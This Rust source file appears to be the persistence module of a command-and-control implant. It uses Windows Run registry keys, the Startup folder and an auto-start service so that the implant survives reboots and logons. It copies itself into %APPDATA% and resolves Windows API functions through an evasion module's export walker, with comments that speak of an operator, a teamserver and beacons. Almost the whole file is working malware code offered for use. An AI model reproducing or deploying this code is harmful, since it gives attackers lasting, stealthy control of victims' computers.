//! Host persistence (ABR-T030): install, remove and report the classic
//! boot/logon survival mechanisms — registry Run keys (HKCU and HKLM),
//! the Startup folder and an auto-start SCM service. Everything runs
//! in-process on the session thread through the manual export walker
//! (advapi32/kernel32 resolved on demand); the persisted binary is a
//! copy of the implant itself unless the operator staged one (`exe`).
//!
//! WMI event-subscription persistence (ABR-T038) is composed by the
//! TEAMSERVER as an in-process PowerShell task — `persist wmi` never
//! reaches this module. The scheduled-task (ITaskService) vector via
//! raw COM remains a follow-up.

// Same on-demand FFI transmute idiom as modules.rs (see the note there).
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;
use crate::message::persist_action;

pub const MECHANISMS: &str = "run-key, run-key-hklm, startup, service";

const PERSIST_RUN_SUBKEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
const HKEY_CURRENT_USER: usize = 0x8000_0001;
const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
const REG_SZ: u32 = 1;

fn dotted_root(root: usize) -> &'static str {
    if root == HKEY_LOCAL_MACHINE {
        "HKLM"
    } else {
        "HKCU"
    }
}

/// Entry point of the PERSIST task.
pub fn stage(
    action: u8,
    mechanism: &str,
    name: &str,
    exe: &str,
    args: &str,
) -> Result<Vec<u8>, String> {
    if name.is_empty() && mechanism != "help" {
        return Err("persist requires a name (service/task/registry value)".into());
    }
    match action {
        persist_action::LIST => list(name),
        persist_action::REMOVE => remove(mechanism, name),
        persist_action::INSTALL => install(mechanism, name, exe, args),
        other => Err(format!("unknown persist action {other:#04x}")),
    }
}

/// Path of the running image.
pub(crate) fn self_path() -> Result<String, String> {
    let get: unsafe extern "system" fn(usize, *mut u16, u32) -> u32 =
        match unsafe { syscalls::export_address("kernel32.dll", "GetModuleFileNameW") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("GetModuleFileNameW unresolved".into()),
        };
    let mut buffer = [0u16; 1024];
    let len = unsafe { get(0, buffer.as_mut_ptr(), buffer.len() as u32) } as usize;
    if len == 0 {
        return Err("GetModuleFileNameW failed".into());
    }
    Ok(String::from_utf16_lossy(&buffer[..len]))
}

/// The binary each mechanism points at: an operator-staged `exe`, or a
/// copy of the implant dropped as %APPDATA%\<name>.exe.
fn persist_target(name: &str, exe: &str) -> Result<String, String> {
    if !exe.is_empty() {
        return Ok(exe.to_string());
    }
    let appdata = std::env::var("APPDATA").map_err(|_| "APPDATA unresolved")?;
    let target = format!(r"{appdata}\{name}.exe");
    let source = self_path()?;
    std::fs::copy(&source, &target).map_err(|e| format!("copy {source} -> {target}: {e}"))?;
    Ok(target)
}

fn quoted_command(exe: &str, args: &str) -> String {
    if args.is_empty() {
        format!("\"{exe}\"")
    } else {
        format!("\"{exe}\" {args}")
    }
}

// --- registry Run keys ---

fn reg_fn(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("advapi32.dll", name) }
}

fn run_key_install(root: usize, name: &str, command: &str) -> Result<String, String> {
    let create: unsafe extern "system" fn(
        usize,
        *const u16,
        u32,
        usize,
        u32,
        u32,
        usize,
        *mut usize,
        usize,
    ) -> i32 = match reg_fn("RegCreateKeyExW") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("RegCreateKeyExW unresolved".into()),
    };
    // NOTE: the *ExW registry setters/readers — the legacy RegSetValueW
    // treats its string argument as a SUBKEY (it creates one and writes
    // the default value), not as a value name.
    let set: unsafe extern "system" fn(usize, *const u16, u32, u32, *const u8, u32) -> i32 =
        match reg_fn("RegSetValueExW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("RegSetValueExW unresolved".into()),
        };
    let close: unsafe extern "system" fn(usize) -> i32 = match reg_fn("RegCloseKey") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("RegCloseKey unresolved".into()),
    };
    let subkey: Vec<u16> = PERSIST_RUN_SUBKEY
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let value_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut data: Vec<u16> = command.encode_utf16().collect();
    let mut key = 0usize;
    let rc = unsafe {
        create(
            root,
            subkey.as_ptr(),
            0,
            0,
            0,               // REG_OPTION_NON_VOLATILE
            0x0001 | 0x0002, // QUERY_VALUE | SET_VALUE
            0,
            &mut key,
            0,
        )
    };
    if rc != 0 || key == 0 {
        return Err(format!(
            "RegCreateKeyExW({}) failed: {rc} (HKLM needs elevation)",
            dotted_root(root)
        ));
    }
    let rc = unsafe {
        set(
            key,
            value_name.as_ptr(),
            0, // Reserved
            REG_SZ,
            data.as_ptr() as *const u8,
            (data.len() * 2) as u32,
        )
    };
    unsafe { close(key) };
    data.clear();
    if rc != 0 {
        return Err(format!("RegSetValueExW failed: {rc}"));
    }
    Ok(format!(
        "run-key {}\\...\\Run\\{name} = {command}",
        dotted_root(root)
    ))
}

fn run_key_read(root: usize, name: &str) -> Option<String> {
    let open: unsafe extern "system" fn(usize, *const u16, u32, u32, *mut usize) -> i32 =
        unsafe { std::mem::transmute(reg_fn("RegOpenKeyExW")?) };
    let query: unsafe extern "system" fn(
        usize,
        *const u16,
        *mut u32, // lpReserved
        *mut u32, // lpType
        *mut u8,  // lpData
        *mut u32, // lpcbData
    ) -> i32 = unsafe { std::mem::transmute(reg_fn("RegQueryValueExW")?) };
    let close: unsafe extern "system" fn(usize) -> i32 =
        unsafe { std::mem::transmute(reg_fn("RegCloseKey")?) };
    let subkey: Vec<u16> = PERSIST_RUN_SUBKEY
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let value_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut key = 0usize;
    let rc = unsafe { open(root, subkey.as_ptr(), 0, 0x0001, &mut key) };
    if rc != 0 || key == 0 {
        return None;
    }
    let mut buffer = [0u8; 2048];
    let mut len = buffer.len() as u32;
    let rc = unsafe {
        query(
            key,
            value_name.as_ptr(),
            std::ptr::null_mut(), // lpReserved
            std::ptr::null_mut(), // lpType (REG_SZ by construction)
            buffer.as_mut_ptr(),
            &mut len,
        )
    };
    unsafe { close(key) };
    if rc != 0 {
        return None;
    }
    let units: Vec<u16> = buffer[..len as usize]
        .as_chunks::<2>()
        .0
        .iter()
        .map(|pair| u16::from_le_bytes(*pair))
        .collect();
    Some(String::from_utf16_lossy(&units))
}

fn run_key_remove(root: usize, name: &str) -> Result<String, String> {
    let open: unsafe extern "system" fn(usize, *const u16, u32, u32, *mut usize) -> i32 =
        match reg_fn("RegOpenKeyExW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("RegOpenKeyExW unresolved".into()),
        };
    let delete: unsafe extern "system" fn(usize, *const u16) -> i32 =
        match reg_fn("RegDeleteValueW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("RegDeleteValueW unresolved".into()),
        };
    let close: unsafe extern "system" fn(usize) -> i32 = match reg_fn("RegCloseKey") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("RegCloseKey unresolved".into()),
    };
    let subkey: Vec<u16> = PERSIST_RUN_SUBKEY
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let value_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut key = 0usize;
    let rc = unsafe { open(root, subkey.as_ptr(), 0, 0x0002, &mut key) };
    if rc != 0 || key == 0 {
        return Err(format!("RegOpenKeyExW({}) failed: {rc}", dotted_root(root)));
    }
    let rc = unsafe { delete(key, value_name.as_ptr()) };
    unsafe { close(key) };
    if rc != 0 {
        return Err(format!("RegDeleteValueW failed: {rc}"));
    }
    Ok(format!(
        "run-key {}\\...\\Run\\{name} removed",
        dotted_root(root)
    ))
}

// --- Startup folder ---

fn startup_path(name: &str) -> Result<String, String> {
    let appdata = std::env::var("APPDATA").map_err(|_| "APPDATA unresolved")?;
    Ok(format!(
        r"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup\{name}.exe"
    ))
}

// --- SCM service ---

fn service_fn(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("advapi32.dll", name) }
}

/// SERVICE_STATUS: 7 DWORDs.
#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ServiceStatus {
    service_type: u32,
    current_state: u32,
    controls_accepted: u32,
    win32_exit_code: u32,
    service_specific_exit_code: u32,
    check_point: u32,
    wait_hint: u32,
}

const SERVICE_STATE: [&str; 8] = [
    "unknown",
    "stopped",
    "start_pending",
    "stop_pending",
    "running",
    "continue_pending",
    "pause_pending",
    "paused",
];

fn service_install(name: &str, command: &str) -> Result<String, String> {
    let open_scm: unsafe extern "system" fn(*const u16, *const u16, u32) -> usize =
        match service_fn("OpenSCManagerW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("OpenSCManagerW unresolved".into()),
        };
    let create: unsafe extern "system" fn(
        usize,
        *const u16,
        *const u16,
        u32,
        u32,
        u32,
        u32,
        *const u16,
        usize,
        *mut u32,
        usize,
        usize,
        usize,
        usize,
    ) -> usize = match service_fn("CreateServiceW") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("CreateServiceW unresolved".into()),
    };
    let close: unsafe extern "system" fn(usize) -> i32 = match service_fn("CloseServiceHandle") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("CloseServiceHandle unresolved".into()),
    };
    let scm = unsafe { open_scm(std::ptr::null(), std::ptr::null(), 0x0002) }; // CREATE_SERVICE
    if scm == 0 {
        return Err("OpenSCManagerW failed (elevation required for services)".into());
    }
    let wide_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_display = wide_name.clone();
    let wide_bin: Vec<u16> = command.encode_utf16().chain(std::iter::once(0)).collect();
    let svc = unsafe {
        create(
            scm,
            wide_name.as_ptr(),
            wide_display.as_ptr(),
            0x0001 | 0x0010, // QUERY_CONFIG | START (minimal for later removal)
            0x10,            // SERVICE_WIN32_OWN_PROCESS
            0x2,             // SERVICE_AUTO_START
            0,               // SERVICE_ERROR_IGNORE
            wide_bin.as_ptr(),
            0, // lpLoadOrderGroup
            std::ptr::null_mut(),
            0, // lpDependencies
            0, // lpServiceStartName
            0, // lpPassword
            0, // dwPwLen
        )
    };
    unsafe { close(scm) };
    if svc == 0 {
        return Err(format!(
            "CreateServiceW({name}) failed (exists? elevation?)"
        ));
    }
    unsafe { close(svc) };
    Ok(format!(
        "service {name} installed (auto-start, starts at boot; not started now — a running copy is a second beacon)"
    ))
}

fn service_state(name: &str) -> Option<&'static str> {
    let open_scm: unsafe extern "system" fn(*const u16, *const u16, u32) -> usize =
        unsafe { std::mem::transmute(service_fn("OpenSCManagerW")?) };
    let open_svc: unsafe extern "system" fn(usize, *const u16, u32) -> usize =
        unsafe { std::mem::transmute(service_fn("OpenServiceW")?) };
    let query: unsafe extern "system" fn(usize, *mut ServiceStatus) -> i32 =
        unsafe { std::mem::transmute(service_fn("QueryServiceStatus")?) };
    let close: unsafe extern "system" fn(usize) -> i32 =
        unsafe { std::mem::transmute(service_fn("CloseServiceHandle")?) };
    let scm = unsafe { open_scm(std::ptr::null(), std::ptr::null(), 0x0001) }; // CONNECT
    if scm == 0 {
        return None;
    }
    let wide_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let svc = unsafe { open_svc(scm, wide_name.as_ptr(), 0x0004) }; // QUERY_STATUS
    unsafe { close(scm) };
    if svc == 0 {
        return None;
    }
    let mut status = ServiceStatus::default();
    let rc = unsafe { query(svc, &mut status) };
    unsafe { close(svc) };
    if rc == 0 {
        return Some("present");
    }
    Some(SERVICE_STATE[status.current_state.min(7) as usize])
}

fn service_remove(name: &str) -> Result<String, String> {
    let open_scm: unsafe extern "system" fn(*const u16, *const u16, u32) -> usize =
        match service_fn("OpenSCManagerW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("OpenSCManagerW unresolved".into()),
        };
    let open_svc: unsafe extern "system" fn(usize, *const u16, u32) -> usize =
        match service_fn("OpenServiceW") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("OpenServiceW unresolved".into()),
        };
    let control: unsafe extern "system" fn(usize, u32, *mut ServiceStatus) -> i32 =
        match service_fn("ControlService") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("ControlService unresolved".into()),
        };
    let delete: unsafe extern "system" fn(usize) -> i32 = match service_fn("DeleteService") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("DeleteService unresolved".into()),
    };
    let close: unsafe extern "system" fn(usize) -> i32 = match service_fn("CloseServiceHandle") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("CloseServiceHandle unresolved".into()),
    };
    let scm = unsafe { open_scm(std::ptr::null(), std::ptr::null(), 0x0001) };
    if scm == 0 {
        return Err("OpenSCManagerW failed (elevation required)".into());
    }
    let wide_name: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    // DELETE is the STANDARD object right 0x10000 (0x0010/0x0020 are
    // START/STOP — easy to confuse; a handle without DELETE makes
    // DeleteService fail with ACCESS_DENIED).
    let svc = unsafe { open_svc(scm, wide_name.as_ptr(), 0x0020 | 0x0001_0000) }; // STOP | DELETE
    unsafe { close(scm) };
    if svc == 0 {
        return Err(format!(
            "OpenServiceW({name}) failed (absent or access denied)"
        ));
    }
    let mut status = ServiceStatus::default();
    // Best-effort stop: a marked-for-deletion running service vanishes
    // on the next boot at the latest.
    unsafe { control(svc, 1, &mut status) }; // SERVICE_CONTROL_STOP
    let rc = unsafe { delete(svc) };
    let last_error = if rc == 0 {
        kernel32_get_last_error()
    } else {
        0
    };
    unsafe { close(svc) };
    if rc == 0 && last_error != 1072 {
        // 1072 = ERROR_SERVICE_MARKED_FOR_DELETE: the delete already
        // landed; the entry disappears once the last handle closes.
        return Err(format!(
            "DeleteService({name}) failed: last error {last_error}"
        ));
    }
    if rc == 0 {
        Ok(format!(
            "service {name} marked for deletion (vanishes when handles close)"
        ))
    } else {
        Ok(format!("service {name} stopped and deleted"))
    }
}

/// GetLastError lives in kernel32, not advapi32.
fn kernel32_get_last_error() -> u32 {
    match unsafe { syscalls::export_address("kernel32.dll", "GetLastError") } {
        Some(addr) => {
            let f: unsafe extern "system" fn() -> u32 = unsafe { std::mem::transmute(addr) };
            unsafe { f() }
        }
        None => 0,
    }
}

// --- install/remove/list dispatch ---

fn install(mechanism: &str, name: &str, exe: &str, args: &str) -> Result<Vec<u8>, String> {
    let target = persist_target(name, exe)?;
    let command = quoted_command(&target, args);
    let line = match mechanism {
        "run-key" => run_key_install(HKEY_CURRENT_USER, name, &command)?,
        "run-key-hklm" => run_key_install(HKEY_LOCAL_MACHINE, name, &command)?,
        "startup" => {
            // The Startup folder vector IS the binary copy.
            let startup = startup_path(name)?;
            let source = if exe.is_empty() {
                &target
            } else {
                &exe.to_string()
            };
            std::fs::copy(source, &startup)
                .map_err(|e| format!("copy {source} -> {startup}: {e}"))?;
            format!("startup {startup} (runs at logon)")
        }
        "service" => service_install(name, &command)?,
        "schtasks" => {
            return Err(format!(
                "mechanism schtasks is a documented follow-up (ITaskService raw COM); available: {MECHANISMS}"
            ));
        }
        "wmi" => {
            return Err(format!(
                "wmi persistence is teamserver-composed (ABR-T038, in-process PowerShell task); available in-process: {MECHANISMS}"
            ));
        }
        other => {
            return Err(format!(
                "unknown mechanism '{other}' (available: {MECHANISMS})"
            ))
        }
    };
    Ok(format!("{line}\n").into_bytes())
}

fn remove(mechanism: &str, name: &str) -> Result<Vec<u8>, String> {
    let line = match mechanism {
        "run-key" => run_key_remove(HKEY_CURRENT_USER, name)?,
        "run-key-hklm" => run_key_remove(HKEY_LOCAL_MACHINE, name)?,
        "startup" => {
            let startup = startup_path(name)?;
            std::fs::remove_file(&startup).map_err(|e| format!("{startup}: {e}"))?;
            format!("startup {startup} removed")
        }
        "service" => service_remove(name)?,
        other => {
            return Err(format!(
                "unknown mechanism '{other}' (available: {MECHANISMS})"
            ))
        }
    };
    Ok(format!("{line}\n").into_bytes())
}

fn list(name: &str) -> Result<Vec<u8>, String> {
    let mut out = String::new();
    for (root, label) in [
        (HKEY_CURRENT_USER, "run-key"),
        (HKEY_LOCAL_MACHINE, "run-key-hklm"),
    ] {
        match run_key_read(root, name) {
            Some(data) => out.push_str(&format!("{label}\t{name}\t{data}\n")),
            None => out.push_str(&format!("{label}\t{name}\t-\n")),
        }
    }
    let startup = startup_path(name)?;
    let exists = std::fs::metadata(&startup).is_ok();
    out.push_str(&format!(
        "startup\t{name}\t{}\n",
        if exists { startup.clone() } else { "-".into() }
    ));
    out.push_str(&format!(
        "service\t{name}\t{}\n",
        service_state(name).unwrap_or("-")
    ));
    Ok(out.into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn run_key_roundtrip_in_hkcu() {
        let name = format!("abraham-test-{}", std::process::id());
        let installed = run_key_install(
            HKEY_CURRENT_USER,
            &name,
            "\"C:\\nonexistent\\abraham-test.exe\" --silent",
        )
        .expect("install run key");
        assert!(installed.contains(&name));
        let read = run_key_read(HKEY_CURRENT_USER, &name).expect("read run key back");
        assert!(read.contains("abraham-test.exe"));
        run_key_remove(HKEY_CURRENT_USER, &name).expect("remove run key");
        assert!(run_key_read(HKEY_CURRENT_USER, &name).is_none());
    }

    #[test]
    fn service_roundtrip_needs_elevation() {
        // Installing a service requires admin: assert the graceful
        // error on non-elevated hosts instead of skipping silently.
        let name = format!("abraham-test-{}", std::process::id());
        match service_install(&name, "\"C:\\nonexistent\\abraham-test.exe\"") {
            Ok(_) => {
                service_remove(&name).expect("remove test service");
            }
            Err(e) => assert!(
                e.contains("elevation") || e.contains("failed"),
                "unexpected error: {e}"
            ),
        }
    }

    #[test]
    fn startup_paths_and_list_shape() {
        let name = "abraham-test";
        let path = startup_path(name).expect("startup path");
        assert!(path.contains("Startup"), "unexpected path: {path}");
        let out = list(name).expect("list");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains("run-key\t"));
        assert!(text.contains("startup\t"));
        assert!(text.contains("service\t"));
    }
}
